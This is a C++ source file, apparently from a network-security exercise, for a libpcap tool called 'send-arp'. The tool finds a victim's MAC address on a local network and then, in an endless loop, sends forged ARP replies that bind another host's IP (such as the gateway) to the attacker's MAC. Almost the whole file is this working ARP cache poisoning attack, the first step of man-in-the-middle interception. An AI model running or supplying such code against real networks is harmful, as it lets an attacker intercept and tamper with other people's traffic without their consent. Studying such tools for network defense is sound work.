#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <stdint.h>
#include <cstring>

/* only use getMyMacAddress & getMyIpAddress function */
#include <sys/socket.h>
#include <net/if.h>
#include <unistd.h>

bool getMyMacAddress(const char* interface, char* mac_str);
bool getMyIpAddress(const char* interface, char* ip_str);

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1");
}

typedef struct ARP_INFECTION_PACKET {
	ETHERNET_HDR eth_h;
	ARP_HDR arp_h;
} __attribute__((packed)) ARP_PACKET;	/* wireshark로 확인 후 00 00 있는거 확인 후 구조체패딩 해제 */

void receive_arp(int c, char* sender_ip){
	ARP_PACKET *packet = new ARP_PACKET;
}

ARP_PACKET send_arp_preparing(
	char* src_mac, char* dst_mac,
	uint8_t oper,
	char* sender_ip, char* target_ip,
	char* sender_mac, char* target_mac
){
	ARP_PACKET packet;

	stringmac_to_bytemac(src_mac, packet.eth_h.ether_shost); // Source MAC address
	stringmac_to_bytemac(dst_mac, packet.eth_h.ether_dhost); // Destination MAC address

	printf("Source MAC: %s, Destination MAC: %s\n", src_mac, dst_mac);

	packet.eth_h.ether_type = htons(0x0806); 	// ARP protocol

	packet.arp_h.hardware_type = htons(0x0001); // Ethernet
	packet.arp_h.protocol_type = htons(0x0800); // IPv4
	packet.arp_h.hardware_length = 0x06; 		// MAC address length
	packet.arp_h.protocol_length = 0x04; 		// IPv4 address length
	packet.arp_h.operation = htons(oper); 		// ARP reply

	stringip_to_byteip(sender_ip, &packet.arp_h.sender_ip_address); 	// Sender IP address
	stringip_to_byteip(target_ip, &packet.arp_h.target_ip_address); 	// Target IP
	stringmac_to_bytemac(sender_mac, packet.arp_h.sender_mac_address); 	// Sender MAC address
	stringmac_to_bytemac(target_mac, packet.arp_h.target_mac_address); 	// Target MAC address

	printf("Sender IP: %s, Target IP: %s\n", sender_ip, target_ip);
	printf("Sender MAC: %s, Target MAC: %s\n", sender_mac, target_mac);

	return packet;
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	char my_mac[18];
	char my_ip[16];
	getMyMacAddress(argv[1], my_mac);
	getMyIpAddress(argv[1], my_ip);

	while (1){
		for(int i = 2; i < argc; i += 2) {
			/* who has <target_ip>? 요청 */
			printf("who has <target_ip>? 요청\n");
			ARP_PACKET tip_req_packet = send_arp_preparing(
				my_mac, "ff:ff:ff:ff:ff:ff",
				0x0001,
				my_ip, argv[i],
				my_mac, "00:00:00:00:00:00"); // ARP request operation
			if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&tip_req_packet), sizeof(tip_req_packet)) != 0) {
				fprintf(stderr, "send packet error: %s\n", pcap_geterr(pcap));
				return -1;
			}

			/* <target_ip> is <victim_mac> 응답 */
			printf("<target_ip> is <victim_mac> 응답\n");
			ARP_PACKET* tip_res_packet = NULL;
			char sender_ip[16];
			while(1) {
				struct pcap_pkthdr* header;
				const u_char* packet;
				int res = pcap_next_ex(pcap, &header, &packet);
				if (res == 0) continue;
				if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
					printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
					break;
				}
				// printf("%u bytes captured\n", header->caplen);

				tip_res_packet = (ARP_PACKET*) packet; /* pointer casting */

				byteip_to_stringip(&tip_res_packet->arp_h.sender_ip_address, sender_ip);
				tip_res_packet = reinterpret_cast<ARP_PACKET*>(const_cast<u_char*>(packet));
				if (ntohs(tip_res_packet->eth_h.ether_type) == 0x0806 && ntohs(tip_res_packet->arp_h.operation) == 2 && strncmp(sender_ip, argv[i], 16) == 0) {
					printf("Received ARP reply from %s\n", argv[i]);
					break;
				}
			}

			/* 위조 패킷 보내기 */
			printf("Sending forged ARP packet to %s\n", argv[i]);
			char victim_mac[18];
			bytemac_to_stringmac(tip_res_packet->arp_h.sender_mac_address, victim_mac);

			ARP_PACKET packet = send_arp_preparing(
				my_mac, victim_mac,
				0x0002,
				argv[i+1], argv[i], /* sender IP, target IP: 공격 대상과 타겟의 IP를 사용 */
				my_mac, victim_mac);
			if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet)) != 0) {
				fprintf(stderr, "send packet error: %s\n", pcap_geterr(pcap));
				return -1;
			}
			printf("Sent ARP packet from %s to %s\n\n\n", my_ip, argv[i + 1]);
		}
		sleep(1); // Wait for a second before sending the next ARP packets
	}
	pcap_close(pcap);
}

bool getMyMacAddress(const char* interface, char* mac_str) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return false;

    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        close(sock);
        return false;
    }
    
    close(sock);
    unsigned char* mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    sprintf(mac_str, "%02x:%02x:%02x:%02x:%02x:%02x",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return true;
}

bool getMyIpAddress(const char* interface, char* ip_str) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return false;

    ifr.ifr_addr.sa_family = AF_INET;

	strncpy(ifr.ifr_name, interface, IFNAMSIZ);

	if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        close(sock);
        return false;
    }

    close(sock);

	strcpy(ip_str, inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));
    return true;
}